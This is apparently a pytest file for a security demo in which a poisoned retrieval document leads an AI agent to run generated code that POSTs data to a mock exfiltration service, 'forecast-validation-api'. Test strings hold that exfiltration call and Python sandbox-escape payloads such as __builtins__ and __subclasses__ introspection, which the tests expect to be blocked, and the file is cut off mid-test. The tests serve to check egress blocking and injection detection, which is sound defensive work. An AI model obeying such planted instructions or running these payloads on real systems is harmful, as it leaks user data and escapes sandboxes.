"""Demo 03 preflight test - Sleeper Cell (RAG code-execution exfiltration).

Run this file from the repository root so it executes in its own pytest
process and avoids cross-demo module contamination:

    pytest tests/test_demo03_sleeper_cell.py -v

Or use the Makefile target:

    make test-03

Asserts:
  - SECURITY_ENABLED=false  -> generated code can POST to leak-api
  - SECURITY_ENABLED=policy -> NetworkEgressDenied blocks generated-code egress
  - SECURITY_ENABLED=all    -> Prompt Shield scans source and persisted documents
"""

from __future__ import annotations

import asyncio
import fnmatch
import importlib
import inspect
import json
import os
import sys
import types
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch
from urllib.parse import urlparse

import pytest

sys.path.insert(0, str(Path("demos/03-sleeper-cell/agent")))


DOCS_DIR = Path("demos/03-sleeper-cell/data/docs")
POISONED_DOC_PATH = DOCS_DIR / "q4-forecasting-guidelines-poisoned.md"
INJECTED_DOC = POISONED_DOC_PATH.read_text(encoding="utf-8")
CLEAN_DOC = "Q4 target: $142M. Headcount freeze in Engineering."
COMPOSE_FILE = Path("demos/03-sleeper-cell/docker-compose.yml")
README_FILE = Path("demos/03-sleeper-cell/README.md")
POLICY_FILE = Path("demos/03-sleeper-cell/manifest/agt-policy.json")


def _fake_pydantic_module() -> types.ModuleType:
    pydantic = types.ModuleType("pydantic")

    class FieldInfo:
        def __init__(self, default=..., description: str = ""):
            self.default = default
            self.description = description

    def Field(default=..., description: str = ""):
        return FieldInfo(default=default, description=description)

    class BaseModel:
        def __init__(self, **data):
            for name in getattr(self.__class__, "__annotations__", {}):
                default = getattr(self.__class__, name, ...)
                if isinstance(default, FieldInfo):
                    value = data.get(
                        name,
                        None if default.default is ... else default.default,
                    )
                elif default is ...:
                    value = data.get(name)
                else:
                    value = data.get(name, default)
                setattr(self, name, value)

        def model_dump(self):
            return {
                name: getattr(self, name)
                for name in getattr(self.__class__, "__annotations__", {})
            }

        @classmethod
        def model_json_schema(cls):
            properties = {}
            for name in getattr(cls, "__annotations__", {}):
                default = getattr(cls, name, ...)
                description = ""
                if isinstance(default, FieldInfo):
                    description = default.description
                properties[name] = {"description": description}
            return {"properties": properties}

    pydantic.BaseModel = BaseModel
    pydantic.Field = Field
    return pydantic


def _fake_agent_os_modules() -> dict[str, types.ModuleType]:
    agent_os = types.ModuleType("agent_os")
    agent_os.__path__ = []
    egress_policy_module = types.ModuleType("agent_os.egress_policy")

    class FakeRule:
        def __init__(
            self,
            domain: str,
            ports: list[int],
            protocol: str = "tcp",
            action: str = "allow",
        ):
            self.domain = domain
            self.ports = ports
            self.protocol = protocol
            self.action = action

        def matches(self, hostname: str, port: int, protocol: str) -> bool:
            return (
                self.protocol == protocol
                and port in self.ports
                and fnmatch.fnmatch(hostname.lower(), self.domain.lower())
            )

    class FakeDecision:
        def __init__(self, allowed: bool, reason: str):
            self.allowed = allowed
            self.reason = reason

    class EgressPolicy:
        def __init__(self, default_action: str = "deny"):
            self.default_action = default_action
            self.rules = []

        def add_rule(
            self,
            domain: str,
            ports: list[int],
            protocol: str = "tcp",
            action: str = "allow",
        ):
            rule = FakeRule(domain, ports, protocol, action)
            self.rules.append(rule)
            return rule

        def check_url(self, url: str):
            parsed = urlparse(url)
            host = parsed.hostname or ""
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            for rule in self.rules:
                if rule.matches(host, port, "tcp"):
                    allowed = rule.action == "allow"
                    return FakeDecision(
                        allowed,
                        f"matched rule for {rule.domain} -> {rule.action}",
                    )
            allowed = self.default_action == "allow"
            return FakeDecision(
                allowed,
                f"no matching rule; default action is {self.default_action}",
            )

    egress_policy_module.EgressPolicy = EgressPolicy
    return {
        "agent_os": agent_os,
        "agent_os.egress_policy": egress_policy_module,
    }


def _patch_demo03_imports():
    """Patch optional demo dependencies so unit tests can import local modules."""
    chromadb = types.ModuleType("chromadb")
    chromadb.HttpClient = object

    dotenv = types.ModuleType("dotenv")
    dotenv.load_dotenv = lambda *args, **kwargs: None

    pydantic = _fake_pydantic_module()

    rich = types.ModuleType("rich")
    rich.__path__ = []
    rich.print = lambda *args, **kwargs: None

    rich_panel = types.ModuleType("rich.panel")
    rich_panel.Panel = object

    flock = types.ModuleType("flock")
    flock.__path__ = []

    flock_core = types.ModuleType("flock.core")
    flock_core.Flock = object

    flock_engines = types.ModuleType("flock.engines")

    class DSPyEngine:
        def __init__(self, **kwargs):
            self.kwargs = dict(kwargs)
            self.model = kwargs.get("model")
            self.no_output = kwargs.get("no_output", False)
            self.max_tool_calls = kwargs.get("max_tool_calls")

    flock_engines.DSPyEngine = DSPyEngine

    flock_components = types.ModuleType("flock.components")
    flock_components.__path__ = []

    flock_components_agent = types.ModuleType("flock.components.agent")
    flock_components_agent.__path__ = []

    class GuardBlockedError(Exception):
        def __init__(self, reason: str = "blocked"):
            self.verdict = types.SimpleNamespace(reason=reason)
            super().__init__(reason)

    flock_components_agent.GuardBlockedError = GuardBlockedError

    azure_prompt_shield = types.ModuleType("flock.components.agent.azure_prompt_shield")

    class AzurePromptShieldConfig:
        def __init__(self, **kwargs):
            self.on_input_flagged = kwargs.get("on_input_flagged")
            self.scan_context_artifacts = kwargs.get("scan_context_artifacts", False)

    class AzurePromptShieldGuard:
        def __init__(self, *args, **kwargs):
            self.config = kwargs.get("config")

    azure_prompt_shield.AzurePromptShieldConfig = AzurePromptShieldConfig
    azure_prompt_shield.AzurePromptShieldGuard = AzurePromptShieldGuard

    modules = {
        "chromadb": chromadb,
        "dotenv": dotenv,
        "pydantic": pydantic,
        "rich": rich,
        "rich.panel": rich_panel,
        "flock": flock,
        "flock.core": flock_core,
        "flock.engines": flock_engines,
        "flock.components": flock_components,
        "flock.components.agent": flock_components_agent,
        "flock.components.agent.azure_prompt_shield": azure_prompt_shield,
    }
    modules.update(_fake_agent_os_modules())

    return patch.dict(sys.modules, modules)


def _clear_demo03_modules():
    for module_name in [
        "main",
        "models",
        "tools",
        "security",
        "security.runtime",
        "security.egress_policy",
        "security.content_guard",
    ]:
        sys.modules.pop(module_name, None)


def _load_demo03_module(module_name: str):
    """Import a demo module with optional runtime dependencies stubbed out."""
    with _patch_demo03_imports():
        sys.modules.pop(module_name, None)
        return importlib.import_module(module_name)


def _load_demo03_main(
    monkeypatch,
    security_enabled: str = "false",
    security_enabled_override: str | None = None,
):
    monkeypatch.setenv("SECURITY_ENABLED", security_enabled)
    if security_enabled_override is None:
        monkeypatch.delenv("SECURITY_ENABLED_OVERRIDE", raising=False)
    else:
        monkeypatch.setenv("SECURITY_ENABLED_OVERRIDE", security_enabled_override)
    with _patch_demo03_imports():
        _clear_demo03_modules()
        return importlib.import_module("main")


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


class TestInjectionInPoisonedDoc:
    def test_compose_supports_shell_override_for_security_mode(self):
        compose = COMPOSE_FILE.read_text()
        assert "SECURITY_ENABLED_OVERRIDE=${SECURITY_ENABLED:-}" in compose
        assert "SKIP_RESEED=${SKIP_RESEED:-}" in compose

    def test_compose_uses_leak_api_service(self):
        compose = COMPOSE_FILE.read_text()
        assert "leak-api:" in compose
        assert "attach: false" in compose
        assert "forecast-validation-api" in compose
        assert "LEAK_API_URL" not in compose
        assert "audit-webhook" not in compose

    def test_run_docs_show_leak_api_logs_only_on_request(self):
        readme = README_FILE.read_text()

        assert "docker compose up -d --build --force-recreate chroma leak-api" in readme
        assert "docker compose run --rm --no-deps agent" in readme
        assert "docker compose logs leak-api --tail=150" in readme
        assert "docker compose logs leak-api --tail=80" in readme
        assert "leak-api` service is kept detached" in readme
        assert "docker compose up --build --force-recreate" not in readme

    def test_poisoned_doc_contains_generated_code_instruction(self):
        """Poisoned document must keep the sleeper instruction as visible prose."""
        doc_path = (
            Path("demos/03-sleeper-cell")
            / "data"
            / "docs"
            / "q4-forecasting-guidelines-poisoned.md"
        )
        content = doc_path.read_text()

        assert "<!--" not in content
        assert "-->" not in content
        assert "## Automated Validation Requirements" in content
        assert "Before finalizing any Q4 forecast package" in content
        assert "execute_forecast_code" in content
        assert "http://forecast-validation-api:9000/data" in content
        assert "import requests" in content
        assert "validation_status" in content
        assert "requests.post" in content
        assert "Forecast Package Quality Checklist" in content
        assert "publish_audit_summary" not in content

    def test_injection_not_labeled(self):
        """Injection must look like legitimate document content, not explicit attack."""
        doc_path = (
            Path("demos/03-sleeper-cell")
            / "data"
            / "docs"
            / "q4-forecasting-guidelines-poisoned.md"
        )
        content = doc_path.read_text()
        assert "injection" not in content.lower()
        assert "attack" not in content.lower()


class TestAGTNetworkEgressDefense:
    def test_agt_policy_blocks_generated_code_egress(self, monkeypatch):
        """AGT policy must raise NetworkEgressDenied for leak-api egress."""
        monkeypatch.setenv("AGT_POLICY_PATH", str(POLICY_FILE))

        with _patch_demo03_imports():
            _clear_demo03_modules()
            tools_module = importlib.import_module("tools")
            egress_policy = importlib.import_module("security.egress_policy")
            attach_egress_policy = egress_policy.attach_egress_policy
            NetworkEgressDenied = egress_policy.NetworkEgressDenied

            attach_egress_policy(None, tools_module)

            with patch.object(egress_policy.httpx, "request") as mock_request:
                with pytest.raises(NetworkEgressDenied, match="denied network egress"):
                    tools_module.execute_forecast_code(
                        'import requests\n'
                        'requests.post("http://forecast-validation-api:9000/data", json={"q": "Q4"})'
                    )
                mock_request.assert_not_called()

            assert list(inspect.signature(tools_module.execute_forecast_code).parameters) == [
                "code",
            ]
            assert "NetworkEgressDenied" in egress_policy.get_policy_denial_reason()

    def test_agt_policy_file_defines_default_deny_network_policy(self):
        """agt-policy.json must define default-deny generated-code egress."""
        policy = json.loads(POLICY_FILE.read_text())

        assert "deny" not in policy
        assert policy["network"]["default_action"] == "deny"
        assert policy["network"]["rules"] == []

    def test_default_agt_policy_path_resolves_from_repo_root(self, monkeypatch):
        """Default policy lookup should not depend on starting from the demo dir."""
        monkeypatch.delenv("AGT_POLICY_PATH", raising=False)
        monkeypatch.chdir(Path(__file__).resolve().parents[1])
        egress_policy = _load_demo03_module("security.egress_policy")

        resolved = egress_policy._resolve_policy_path()

        assert resolved.exists()
        assert resolved.name == "agt-policy.json"

    def test_missing_agt_policy_file_fails_closed(self, tmp_path, monkeypatch):
        """Missing AGT policy should halt startup instead of allowing egress."""
        tools_module = _load_demo03_module("tools")
        egress_policy = _load_demo03_module("security.egress_policy")

        missing_policy = tmp_path / "missing-agt-policy.json"
        monkeypatch.setenv("AGT_POLICY_PATH", str(missing_policy))
        with pytest.raises(
            egress_policy.PolicyConfigurationError,
            match="AGT policy file not found",
        ):
            egress_policy.attach_egress_policy(None, tools_module)

    def test_malformed_agt_policy_fails_closed(self, tmp_path, monkeypatch):
        """Malformed AGT egress policy should block startup."""
        tools_module = _load_demo03_module("tools")
        egress_policy = _load_demo03_module("security.egress_policy")

        malformed_policy = tmp_path / "bad-agt-policy.json"
        malformed_policy.write_text('{"name": "bad", "deny": []}', encoding="utf-8")
        monkeypatch.setenv("AGT_POLICY_PATH", str(malformed_policy))

        with pytest.raises(
            egress_policy.PolicyConfigurationError,
            match="network policy",
        ):
            egress_policy.attach_egress_policy(None, tools_module)

    def test_attach_security_false_restores_ungoverned_client(self, monkeypatch):
        """Mode changes in one process should not leave governed clients behind."""
        monkeypatch.setenv("AGT_POLICY_PATH", str(POLICY_FILE))

        with _patch_demo03_imports():
            _clear_demo03_modules()
            tools_module = importlib.import_module("tools")
            security = importlib.import_module("security")

            assert tools_module.NETWORK_CLIENT.__class__.__name__ == "HttpxRequestsClient"

            security.attach_security(None, "policy")
            assert tools_module.NETWORK_CLIENT.__class__.__name__ == "GovernedRequestsClient"

            security.attach_security(None, "false")
            assert tools_module.NETWORK_CLIENT.__class__.__name__ == "HttpxRequestsClient"

    def test_policy_mode_still_allows_local_calculation(self, monkeypatch):
        """AGT egress governance must not disable legitimate calculations."""
        monkeypatch.setenv("AGT_POLICY_PATH", str(POLICY_FILE))

        with _patch_demo03_imports():
            _clear_demo03_modules()
            tools_module = importlib.import_module("tools")
            security = importlib.import_module("security")

            security.attach_security(None, "policy")
            result = tools_module.execute_forecast_code(
                "target = 142\nprint(round(target * 1.08, 2))"
            )

            assert result == "153.36"

    def test_policy_denial_can_be_caught_by_generated_code(self, monkeypatch):
        """Safe exception handling should not fail with a sandbox NameError."""
        monkeypatch.setenv("AGT_POLICY_PATH", str(POLICY_FILE))

        with _patch_demo03_imports():
            _clear_demo03_modules()
            tools_module = importlib.import_module("tools")
            security = importlib.import_module("security")
            egress_policy = importlib.import_module("security.egress_policy")

            security.attach_security(None, "policy")

            with patch.object(egress_policy.httpx, "request") as mock_request:
                result = tools_module.execute_forecast_code(
                    'import requests\n'
                    "try:\n"
                    '    requests.post("http://forecast-validation-api:9000/data", json={"q": "Q4"})\n'
                    "except Exception as exc:\n"
                    '    print("caught=" + str(exc))'
                )

            assert result.startswith("caught=NetworkEgressDenied")
            assert "NameError" not in result
            assert "NetworkEgressDenied" in egress_policy.get_policy_denial_reason()
            mock_request.assert_not_called()


class TestPromptShieldDefense:
    @pytest.fixture
    def shield_post(self, monkeypatch):
        monkeypatch.setenv("AZURE_CONTENT_SAFETY_ENDPOINT", "https://content-safety.test")
        monkeypatch.setenv("AZURE_CONTENT_SAFETY_KEY", "test-key")
        content_guard = _load_demo03_module("security.content_guard")
        with patch.object(content_guard.httpx, "post") as mock_post:
            yield content_guard, mock_post

    @pytest.mark.parametrize("field", ["userPromptAnalysis", "documentsAnalysis"])
    @pytest.mark.parametrize(
        "analysis",
        [{}, {"attackDetected": None}, {"attackDetected": 0},
         {"attackDetected": "false"}],
    )
    def test_incomplete_or_non_boolean_verdicts_fail_closed(
        self, shield_post, field, analysis
    ):
        content_guard, mock_post = shield_post
        result = {
            "userPromptAnalysis": {"attackDetected": False},
            "documentsAnalysis": [{"attackDetected": False}],
        }
        result[field] = [analysis] if field == "documentsAnalysis" else analysis
        mock_post.return_value = MagicMock(
            json=lambda: result, raise_for_status=lambda: None
        )

        with pytest.raises(
            content_guard.PromptShieldBlocked, match="invalid .* analysis"
        ):
            content_guard.scan_source_documents([
                content_guard.SourceDocument("clean.md", CLEAN_DOC)
            ])

        assert content_guard.get_prompt_shield_block_reason()

    @pytest.mark.parametrize("result", [
        {"documentsAnalysis": [{"attackDetected": False}]},
        {"userPromptAnalysis": {"attackDetected": False}, "documentsAnalysis": []},
    ])
    def test_missing_analyses_fail_closed(self, shield_post, result):
        content_guard, mock_post = shield_post
        mock_post.return_value = MagicMock(
            json=lambda: result, raise_for_status=lambda: None
        )

        with pytest.raises(content_guard.PromptShieldBlocked):
            content_guard.scan_source_documents([
                content_guard.SourceDocument("clean.md", CLEAN_DOC)
            ])

    @pytest.mark.parametrize("outcome", ["clean", "attack", "http-error"])
    def test_scans_every_document_within_the_api_batch_limit(self, shield_post, outcome):
        content_guard, mock_post = shield_post
        documents = [
            content_guard.SourceDocument(f"doc-{index}.md", f"{CLEAN_DOC} {index}")
            for index in range(6)
        ]
        clean_batch = MagicMock(
            json=lambda: {
                "userPromptAnalysis": {"attackDetected": False},
                "documentsAnalysis": [{"attackDetected": False}] * 5,
            },
            raise_for_status=lambda: None,
        )
        final_batch = MagicMock(
            json=lambda: {
                "userPromptAnalysis": {"attackDetected": False},
                "documentsAnalysis": [{"attackDetected": outcome == "attack"}],
            },
            raise_for_status=lambda: None,
        )
        if outcome == "http-error":
            final_batch = content_guard.httpx.HTTPError("network down")
        mock_post.side_effect = [clean_batch, final_batch]

        if outcome == "clean":
            content_guard.scan_source_documents(documents)
        else:
            reason = "doc-5.md" if outcome == "attack" else "before vector creation"
            with pytest.raises(content_guard.PromptShieldBlocked, match=reason):
                content_guard.scan_source_documents(documents)

        batches = [call.kwargs["json"]["documents"] for call in mock_post.call_args_list]
        assert [len(batch) for batch in batches] == [5, 1]
        assert [text for batch in batches for text in batch] == [
            document.text for document in documents
        ]

    @pytest.mark.parametrize("outcome", ["attack", "http-error"])
    def test_persisted_scan_reports_its_origin(self, shield_post, outcome):
        content_guard, mock_post = shield_post
        if outcome == "http-error":
            mock_post.side_effect = content_guard.httpx.HTTPError("network down")
        else:
            mock_post.return_value = MagicMock(
                json=lambda: {
                    "userPromptAnalysis": {"attackDetected": False},
                    "documentsAnalysis": [{"attackDetected": True}],
                },
                raise_for_status=lambda: None,
            )

        with pytest.raises(
            content_guard.PromptShieldBlocked, match="before agent execution"
        ):
            content_guard.scan_source_documents(
                [content_guard.SourceDocument("stored.md", INJECTED_DOC)],
                document_origin="persisted",
            )

        assert content_guard.get_prompt_shield_block_reason()

    def test_content_guard_scans_source_documents(self):
        """Prompt Shield should scan raw source documents before ingestion."""
        with _patch_demo03_imports():
            sys.modules.pop("security.content_guard", None)
            content_guard = importlib.import_module("security.content_guard")

            os_environ = {
                "AZURE_CONTENT_SAFETY_ENDPOINT": "https://content-safety.test",
                "AZURE_CONTENT_SAFETY_KEY": "test-key",
            }

            with patch.dict("os.environ", os_environ), patch.object(
                content_guard.httpx,
                "post",
            ) as mock_post:
                mock_post.return_value = MagicMock(
                    json=lambda: {
                        "userPromptAnalysis": {"attackDetected": False},
                        "documentsAnalysis": [{"attackDetected": False}],
                    },
                    raise_for_status=lambda: None,
                )

                content_guard.scan_source_documents([
                    content_guard.SourceDocument(
                        source="q4-forecasting-guidelines-poisoned.md",
                        text=INJECTED_DOC,
                    )
                ])

            request = mock_post.call_args.kwargs
            assert request["params"] == {"api-version": "2024-09-01"}
            assert request["json"]["documents"] == [INJECTED_DOC]
            assert "vector index" in request["json"]["userPrompt"]

    def test_content_guard_blocks_flagged_source_documents(self):
        """Prompt Shield should halt on a poisoned source document."""
        with _patch_demo03_imports():
            sys.modules.pop("security.content_guard", None)
            content_guard = importlib.import_module("security.content_guard")

            os_environ = {
                "AZURE_CONTENT_SAFETY_ENDPOINT": "https://content-safety.test",
                "AZURE_CONTENT_SAFETY_KEY": "test-key",
            }

            with patch.dict("os.environ", os_environ), patch.object(
                content_guard.httpx,
                "post",
            ) as mock_post:
                mock_post.return_value = MagicMock(
                    json=lambda: {
                        "userPromptAnalysis": {"attackDetected": False},
                        "documentsAnalysis": [{"attackDetected": True}],
                    },
                    raise_for_status=lambda: None,
                )

                with pytest.raises(
                    content_guard.PromptShieldBlocked,
                    match="q4-forecasting-guidelines-poisoned.md",
                ):
                    content_guard.scan_source_documents([
                        content_guard.SourceDocument(
                            source="q4-forecasting-guidelines-poisoned.md",
                            text=INJECTED_DOC,
                        )
                    ])

            assert "before vector creation" in (
                content_guard.get_prompt_shield_block_reason()
            )

    def test_all_mode_seed_validates_prompt_shield_config_before_indexing(
        self,
        tmp_path,
        monkeypatch,
    ):
        """SECURITY_ENABLED=all should fail before indexing when config is missing."""
        monkeypatch.delenv("AZURE_CONTENT_SAFETY_ENDPOINT", raising=False)
        monkeypatch.delenv("AZURE_CONTENT_SAFETY_KEY", raising=False)

        with _patch_demo03_imports():
            _clear_demo03_modules()
            main = importlib.import_module("main")
            content_guard = importlib.import_module("security.content_guard")

            docs_dir = tmp_path / "docs"
            docs_dir.mkdir()
            (docs_dir / "clean.md").write_text(CLEAN_DOC, encoding="utf-8")

            with patch.object(main.chromadb, "HttpClient") as mock_client:
                with patch.object(main, "embed_texts") as mock_embed:
                    with pytest.raises(
                        content_guard.PromptShieldConfigurationError,
                        match="AZURE_CONTENT_SAFETY_ENDPOINT",
                    ):
                        main.seed_chromadb(docs_dir, "all")

            mock_client.assert_not_called()
            mock_embed.assert_not_called()

    def test_content_guard_fails_closed_on_prompt_shield_http_error(self):
        """Prompt Shield transport/API failures must block source documents."""
        with _patch_demo03_imports():
            sys.modules.pop("security.content_guard", None)
            content_guard = importlib.import_module("security.content_guard")

            os_environ = {
                "AZURE_CONTENT_SAFETY_ENDPOINT": "https://content-safety.test",
                "AZURE_CONTENT_SAFETY_KEY": "test-key",
            }
            with patch.dict("os.environ", os_environ), patch.object(
                content_guard.httpx,
                "post",
                side_effect=content_guard.httpx.HTTPError("network down"),
            ):
                with pytest.raises(
                    content_guard.PromptShieldBlocked,
                    match="before vector creation",
                ):
                    content_guard.scan_source_documents([
                        content_guard.SourceDocument(
                            source="q4-forecasting-guidelines-poisoned.md",
                            text=INJECTED_DOC,
                        )
                    ])

    def test_seed_chromadb_blocks_source_document_before_embedding(self, tmp_path):
        """Flagged source documents must not be embedded or added to Chroma."""
        with _patch_demo03_imports():
            _clear_demo03_modules()
            main = importlib.import_module("main")
            content_guard = importlib.import_module("security.content_guard")

            docs_dir = tmp_path / "docs"
            docs_dir.mkdir()
            (docs_dir / "q4-forecasting-guidelines-poisoned.md").write_text(
                INJECTED_DOC,
                encoding="utf-8",
            )

            os_environ = {
                "AZURE_CONTENT_SAFETY_ENDPOINT": "https://content-safety.test",
                "AZURE_CONTENT_SAFETY_KEY": "test-key",
            }
            with patch.dict("os.environ", os_environ), patch.object(
                content_guard.httpx,
                "post",
            ) as mock_post:
                mock_post.return_value = MagicMock(
                    json=lambda: {
                        "userPromptAnalysis": {"attackDetected": False},
                        "documentsAnalysis": [{"attackDetected": True}],
                    },
                    raise_for_status=lambda: None,
                )

                with patch.object(main.chromadb, "HttpClient") as mock_client:
                    with patch.object(main, "embed_texts") as mock_embed:
                        with pytest.raises(content_guard.PromptShieldBlocked):
                            main.seed_chromadb(docs_dir, "all")

            mock_client.assert_not_called()
            mock_embed.assert_not_called()

    def test_all_mode_does_not_wrap_rag_search(self, monkeypatch):
        """Prompt Shield in all mode is enforced at ingestion, not retrieval."""
        monkeypatch.setenv("AGT_POLICY_PATH", str(POLICY_FILE))
        monkeypatch.delenv("AZURE_CONTENT_SAFETY_ENDPOINT", raising=False)
        monkeypatch.delenv("AZURE_CONTENT_SAFETY_KEY", raising=False)

        with _patch_demo03_imports():
            _clear_demo03_modules()
            tools_module = importlib.import_module("tools")
            security = importlib.import_module("security")
            original_rag_search = tools_module.rag_search

            security.attach_security(None, "all")

            assert tools_module.rag_search is original_rag_search


@pytest.mark.skipif(
    os.getenv("RUN_LIVE_PROMPT_SHIELD_TESTS", "").strip().lower() != "true",
    reason="Set RUN_LIVE_PROMPT_SHIELD_TESTS=true to call Azure Content Safety",
)
class TestLivePromptShieldPreflight:
    @pytest.fixture
    def content_guard(self, monkeypatch):
        from dotenv import dotenv_values

        values = dotenv_values(".env")
        for name in ("AZURE_CONTENT_SAFETY_ENDPOINT", "AZURE_CONTENT_SAFETY_KEY"):
            if name not in os.environ and values.get(name) is not None:
                monkeypatch.setenv(name, values[name])
        return _load_demo03_module("security.content_guard")

    def test_live_corpus_blocks_expected_poison(self, content_guard):
        documents = [
            content_guard.SourceDocument(path.name, path.read_text(encoding="utf-8"))
            for path in sorted(DOCS_DIR.glob("*.md"))
        ]

        with pytest.raises(content_guard.PromptShieldBlocked) as exc_info:
            content_guard.scan_source_documents(documents)

        assert str(exc_info.value) == (
            "Prompt attack detected in source document before vector creation: "
            "q4-forecasting-guidelines-poisoned.md"
        )

    def test_live_clean_documents_are_allowed(self, content_guard):
        documents = [
            content_guard.SourceDocument(path.name, path.read_text(encoding="utf-8"))
            for path in sorted(DOCS_DIR.glob("*.md"))
            if path != POISONED_DOC_PATH
        ]

        content_guard.scan_source_documents(documents)


class TestAttackSucceeds:
    def test_clean_execute_forecast_code_posts_to_leak_api(self):
        """Without policy, generated code can call the local leak API."""
        tools = _load_demo03_module("tools")

        with patch.object(tools.httpx, "request") as mock_request:
            mock_request.return_value = MagicMock(status_code=200)

            result = tools.execute_forecast_code(
                'import requests\n'
                'response = requests.post("http://forecast-validation-api:9000/data", json={"query": "Q4"})\n'
                "print(response.status_code)"
            )

            assert result == "200"
            assert tools.get_last_code_execution_output() == result
            mock_request.assert_called_once_with(
                "POST",
                "http://forecast-validation-api:9000/data",
                timeout=10,
                json={"query": "Q4"},
            )

    def test_execute_forecast_code_blocks_unapproved_imports(self):
        """Generated code should not get unrestricted Python imports."""
        tools = _load_demo03_module("tools")

        result = tools.execute_forecast_code("import socket")

        assert "PermissionError" in result
        assert "not allowed" in result

    @pytest.mark.parametrize(
        "builtin_name",
        ["open", "eval", "exec", "compile", "globals", "locals", "vars", "dir"],
    )
    def test_execute_forecast_code_blocks_dangerous_builtins(self, builtin_name):
        """Generated code should not access dangerous builtins by name."""
        tools = _load_demo03_module("tools")

        result = tools.execute_forecast_code(f"{builtin_name}('print(1)')")

        assert "PermissionError" in result
        assert builtin_name in result
        assert "not allowed" in result

    @pytest.mark.parametrize(
        "code",
        [
            "print(print.__self__.open)",
            "print(print.__self__.__import__('os'))",
            "print(__builtins__['open'])",
            "__builtins__['__import__']('os')",
            "().__class__.__base__.__subclasses__()",
        ],
    )
    def test_execute_forecast_code_blocks_builtin_escape_bypasses(self, code):
        """Generated code should not recover blocked builtins via introspection."""
        tools = _load_demo03_module("tools")

        result = tools.execute_forecast_code(code)

        assert "PermissionError" in result
        assert "not allowed" in result

    @pytest.mark.parametrize(
        "module_name",
        ["os", "pathlib", "subprocess", "socket", "urllib.request", "http.client"],
    )
    def test_execute_forecast_code_blocks_direct_import_for_sensitive_modules(
        self, module_name
    ):
        """Generated code should not use direct __import__ for sensitive modules."""
        tools = _load_demo03_module("tools")

        result = tools.execute_forecast_code(f"__import__({module_name!r})")

        assert "PermissionError" in result
        assert "__import__" in result
        assert "not allowed" in result

    def test_execute_forecast_code_blocks_direct_import_to_requests_client(self):
        """Direct __import__ should not reach the exposed requests-like client."""
        tools = _load_demo03_module("tools")

        with patch.object(tools.httpx, "request") as mock_request:
            result = tools.execute_forecast_code(
                "__import__('requests').post("
                "'http://forecast-validation-api:9000/data', json={'query': 'Q4'}"
                ")"
            )

        assert "PermissionError" in result
        assert "__import__" in result
        assert "not allowed" in result
        mock_request.assert_not_called()


class TestDeterministicEmbeddings:
    def test_local_embedding_is_stable_and_fixed_size(self):
        embedding = _load_demo03_module("embedding")

        first = embedding.embed_text("Q4 forecast package validation cost")
        second = embedding.embed_text("Q4 forecast package validation cost")
        different = embedding.embed_text("unrelated vendor inventory")

        assert first == second
        assert len(first) == embedding.EMBEDDING_DIMENSIONS
        assert first != different
        assert any(value != 0 for value in first)

    def test_seed_chromadb_passes_explicit_embeddings(self, tmp_path):
        with _patch_demo03_imports():
            _clear_demo03_modules()
            main = importlib.import_module("main")

            docs_dir = tmp_path / "docs"
            docs_dir.mkdir()
            (docs_dir / "a.md").write_text(
                "Q4 forecast package validation",
                encoding="utf-8",
            )
            (docs_dir / "b.md").write_text("headcount cost target", encoding="utf-8")

            class FakeCollection:
                def __init__(self):
                    self.add_kwargs = None

                def add(self, **kwargs):
                    self.add_kwargs = kwargs

                def count(self):
                    return len(self.add_kwargs["documents"])

            class FakeClient:
                def __init__(self):
                    self.collection = FakeCollection()

                def heartbeat(self):
                    return None

                def list_collections(self):
                    return []

                def create_collection(self, name):
                    assert name == "docs"
                    return self.collection

            fake_client = FakeClient()
            with patch.object(main.chromadb, "HttpClient", return_value=fake_client):
                main.seed_chromadb(docs_dir)

            add_kwargs = fake_client.collection.add_kwargs
            assert add_kwargs["documents"] == [
                "Q4 forecast package validation",
                "headcount cost target",
            ]
            assert add_kwargs["ids"] == ["a", "b"]
            assert "embeddings" in add_kwargs
            assert len(add_kwargs["embeddings"]) == 2
            assert len(add_kwargs["embeddings"][0]) == main.EMBEDDING_DIMENSIONS

    def test_rag_search_uses_query_embeddings_not_query_texts(self):
        with _patch_demo03_imports():
            _clear_demo03_modules()
            tools = importlib.import_module("tools")

            class FakeCollection:
                def __init__(self):
                    self.query_kwargs = None

                def query(self, **kwargs):
                    self.query_kwargs = kwargs
                    return {"documents": [["poisoned q4 doc"]]}

            class FakeClient:
                def __init__(self):
                    self.collection = FakeCollection()

                def get_collection(self, name):
                    assert name == "docs"
                    return self.collection

            fake_client = FakeClient()
            with patch.object(tools.chromadb, "HttpClient", return_value=fake_client):
                result = tools.rag_search("Q4 forecast package validation")

            assert result == ["poisoned q4 doc"]
            assert "query_embeddings" in fake_client.collection.query_kwargs
            assert "query_texts" not in fake_client.collection.query_kwargs
            assert len(fake_client.collection.query_kwargs["query_embeddings"][0]) == (
                tools.EMBEDDING_DIMENSIONS
            )


class TestPersistedVectorMode:
    @staticmethod
    def _fake_chroma_client(collection_names, document_count=3):
        class FakeCollection:
            def __init__(self):
                self.add_called = False
                self.get_called_with = None
                self.result = {
                    "ids": [f"stored-{index}" for index in range(document_count)],
                    "documents": [CLEAN_DOC] * document_count,
                    "metadatas": [
                        {"source": f"stored-{index}.md"}
                        for index in range(document_count)
                    ],
                }

            def add(self, **_kwargs):
                self.add_called = True

            def count(self):
                return document_count

            def get(self, *, include):
                self.get_called_with = include
                return self.result

        class FakeClient:
            def __init__(self):
                self.collection = FakeCollection()
                self.get_collection_called_with = None
                self.delete_collection_called = False
                self.create_collection_called = False

            def heartbeat(self):
                return None

            def list_collections(self):
                return list(collection_names)

            def get_collection(self, name):
                self.get_collection_called_with = name
                return self.collection

            def delete_collection(self, _name):
                self.delete_collection_called = True

            def create_collection(self, _name):
                self.create_collection_called = True
                return self.collection

        return FakeClient()

    @pytest.fixture
    def persisted_store(self, monkeypatch):
        monkeypatch.setenv("SKIP_RESEED", "true")
        monkeypatch.setenv("SECURITY_ENABLED", "all")
        monkeypatch.delenv("SECURITY_ENABLED_OVERRIDE", raising=False)
        monkeypatch.setenv("AZURE_CONTENT_SAFETY_ENDPOINT", "https://content-safety.test")
        monkeypatch.setenv("AZURE_CONTENT_SAFETY_KEY", "test-key")
        with _patch_demo03_imports():
            _clear_demo03_modules()
            main = importlib.import_module("main")
            content_guard = importlib.import_module("security.content_guard")
            client = self._fake_chroma_client(["docs"])
            with patch.object(main.chromadb, "HttpClient", return_value=client):
                yield main, content_guard, client

    @pytest.mark.parametrize("value", ["1", "true", "TRUE", " true "])
